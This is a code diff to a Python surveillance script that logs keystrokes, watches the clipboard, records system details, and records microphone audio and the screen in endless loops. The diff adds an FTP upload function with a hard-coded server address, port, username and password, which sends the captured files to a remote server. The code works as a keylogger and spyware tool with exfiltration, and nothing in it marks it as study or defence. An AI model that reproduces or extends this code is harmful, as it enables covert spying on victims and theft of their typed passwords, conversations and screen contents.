@@ -9,22 +9,35 @@ import pyaudio
 import wave
 import cv2
 import pyautogui
+import os
+import fileinput
 import numpy as np
 from requests import get 
+from ftplib import FTP 
 from scipy.io.wavfile import read, write
 from pynput.keyboard import Key, Listener
+from ftplib import FTP 
 
 WAV_FILENAME = "soundrec.wav"
-MP4_FILENAME = "screenrec.mp4"
+SCREEN_RECORDING_MP4_FILENAME = "screenrec.mp4"
+MACHINE_INFO_FILE = "machineinfo.text"
+LOG_FILE = "keylogs.text"
+READABLE_LOG_FILE = "readablelogs.text"
+CLIPBOARD_HISTORY_FILE = "clipboardhistory.text"
+SERVER_ADDRESS = "192.168.1.65"
+SERVER_USERNMAE = "Aly Muhammad Aly"
+SERVER_PASSWORD = "alyaly"
 SCREEN_RECORDING_FPS = 3
 SCREEN_RECORDING_SECONDS = 60
+WEBCAM_RECORDING_SECONDS = 60
 MP4_FOURCC = 1983148141
-SCREEN_SIZE = (2560, 1600) 
-CHUNK_IN_BYTES = 1024
+SCREEN_RECORDING_SIZE = (2560, 1600) 
+SENDING_SPEED_IN_BYTES = 1024
 SOUND_FORMAT = pyaudio.paInt16
 CHANNELS = 1
 SAMPLE_RATE = 44100
 SOUND_RECORD_SECONDS = 60
+SERVER_PORT = 2121
 
 
 def press_keys(key):
@@ -35,16 +48,15 @@ def press_keys(key):
 	write_log_file(keys, current_date_time)
 	keys  = []
 
-
 def write_log_file(keys, current_date_time):
-	with open("log.text", "a") as file:
+	with open(LOG_FILE, "a") as file:
 		for key in keys:
 			file.write(str(key))
 			file.write(str(current_date_time))
 			file.write("\n")
 
 def write_readable_file(keys, date_time):
-	with open("keys.text", "a") as file:
+	with open(READABLE_LOG_FILE, "a") as file:
 		for key in keys:
 			k = str(key).replace("'","")
 			if k.find("space") > 0:
@@ -55,7 +67,7 @@ def write_readable_file(keys, date_time):
 				file.write(k)
 
 def write_machine_info_file():
-	with open("mach_info.text", "a") as file:
+	with open(MACHINE_INFO_FILE, "a") as file:
 		file.write("Host name: %s" %socket.gethostname())
 		file.write("\n")
 		file.write("IP address: %s" %socket.gethostbyname(socket.gethostname()))
@@ -72,43 +84,63 @@ def write_machine_info_file():
 
 def get_clipboard_history():
 	clipboard_history = ""
-	open("clipboard_hist.text", "w")
+	open(CLIPBOARD_HISTORY_FILE, "w")
 	while True:
-		with open("clipboard_hist.text", "a") as file:
-			file.write(str(pyperclip.paste()))
-			file.write("\n")
-		clipboard_history = pyperclip.paste()
+		if pyperclip.paste() == clipboard_history:
+ 			print("nothing new")
+ 		else:
+ 			with open(CLIPBOARD_HISTORY_FILE, "a") as file:
+ 				file.write(pyperclip.paste())
+ 				file.write(str(pyperclip.paste()))
+ 				file.write("\n")
+ 			clipboard_history = pyperclip.paste()
 
 def record_sound():
-	my_pyaudio = pyaudio.PyAudio()
-	stream = my_pyaudio.open(format=SOUND_FORMAT,channels=CHANNELS,rate=SAMPLE_RATE,input=True,
-						  output=True,frames_per_buffer=CHUNK_IN_BYTES)
-	frames = []
-	print("Recording...")
-	for i in range(int(SAMPLE_RATE / CHUNK_IN_BYTES * SOUND_RECORD_SECONDS)):
-		data = stream.read(CHUNK_IN_BYTES)
-		frames.append(data)
-	print("Finished recording.")
-	stream.stop_stream()
-	stream.close()
-	my_pyaudio.terminate()
-	# Generating an audio (wav) file.
-	wave_file = wave.open(WAV_FILENAME, "wb")
-	wave_file.setnchannels(CHANNELS)
-	wave_file.setsampwidth(my_pyaudio.get_sample_size(SOUND_FORMAT))
-	wave_file.setframerate(SAMPLE_RATE)
-	wave_file.writeframes(b"".join(frames))
-	wave_file.close()
+	while True:
+		my_pyaudio = pyaudio.PyAudio()
+		stream = my_pyaudio.open(format=SOUND_FORMAT,channels=CHANNELS,rate=SAMPLE_RATE,
+								 input=True,output=True,frames_per_buffer=SENDING_SPEED_IN_BYTES)
+		frames = []
+		print("Recording...")
+		for i in range(int(SAMPLE_RATE / SENDING_SPEED_IN_BYTES * SOUND_RECORD_SECONDS)):
+			data = stream.read(SENDING_SPEED_IN_BYTES)
+			frames.append(data)
+		print("Finished recording.")
+		stream.stop_stream()
+		stream.close()
+		my_pyaudio.terminate()
+
+		# Generating an audio (wav) file.
+		wave_file = wave.open(WAV_FILENAME, "wb")
+		wave_file.setnchannels(CHANNELS)
+		wave_file.setsampwidth(my_pyaudio.get_sample_size(SOUND_FORMAT))
+		wave_file.setframerate(SAMPLE_RATE)
+		wave_file.writeframes(b"".join(frames))
+		wave_file.close()
 
 def record_screen():
-	video_file = cv2.VideoWriter(MP4_FILENAME, MP4_FOURCC, SCREEN_RECORDING_FPS, SCREEN_SIZE)
-	for i in range(int(SCREEN_RECORDING_FPS * SCREEN_RECORDING_SECONDS)):
-		screenshot = pyautogui.screenshot()
-		frame = np.array(screenshot)
-		frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-		video_file.write(frame)
-	cv2.destroyAllWindows()
-	video_file.release()
+	file_number = 1 
+	while True:
+		video_file = cv2.VideoWriter(SCREEN_RECORDING_MP4_FILENAME, MP4_FOURCC,
+									 SCREEN_RECORDING_FPS,SCREEN_RECORDING_SIZE)
+		for i in range(int(SCREEN_RECORDING_FPS * SCREEN_RECORDING_SECONDS)):
+			screenshot = pyautogui.screenshot()
+			frame = np.array(screenshot)
+			frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+			video_file.write(frame)
+		cv2.destroyAllWindows()
+		video_file.release()
+
+def send_file_via_ftp_server(file_name):
+	# Creating an FTP instance and connecting to the server.
+	ftp = FTP()
+	ftp.set_debuglevel(2)
+	ftp.connect(SERVER_ADDRESS, SERVER_PORT) 
+	ftp.login(SERVER_USERNMAE,SERVER_PASSWORD)
+
+	# Sending files using Storbinary method.
+	with open(file_name, 'rb') as file:
+		ftp.storbinary('STOR %s' % os.path.basename(file_name), file, SENDING_SPEED_IN_BYTES)
 
 def main():
 	machine_info = threading.Thread(target=write_machine_info_file)
